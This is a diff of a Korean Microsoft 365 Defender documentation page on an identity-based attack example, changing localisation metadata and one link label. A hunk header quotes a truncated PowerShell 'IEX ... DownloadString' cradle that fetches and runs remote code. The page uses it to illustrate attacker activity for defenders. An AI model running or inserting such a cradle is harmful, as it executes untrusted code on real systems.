@@ -22,12 +22,12 @@ search.appverid:
 - MOE150
 - MET150
 ms.technology: m365d
-ms.openlocfilehash: e56d6d5d78101da1f6da4c14ade25e80aa5b5063
-ms.sourcegitcommit: 05f40904f8278f53643efa76a907968b5c662d9a
+ms.openlocfilehash: c028289a58247075c33e85d6d6f3797b3ddad7b4
+ms.sourcegitcommit: de5fce90de22ba588e75e1a1d2e87e03b9e25ec7
 ms.translationtype: MT
 ms.contentlocale: ko-KR
-ms.lasthandoff: 04/30/2021
-ms.locfileid: "52114857"
+ms.lasthandoff: 05/10/2021
+ms.locfileid: "52297191"
 ---
 # <a name="example-of-an-identity-based-attack"></a>ID 기반 공격의 예
 
@@ -95,4 +95,4 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 
 - [인시던트 개요](incidents-overview.md)
 - [인시던트 관리](manage-incidents.md)
-- [인시던트 분석](investigate-incidents.md)
+- [인시던트 조사](investigate-incidents.md)
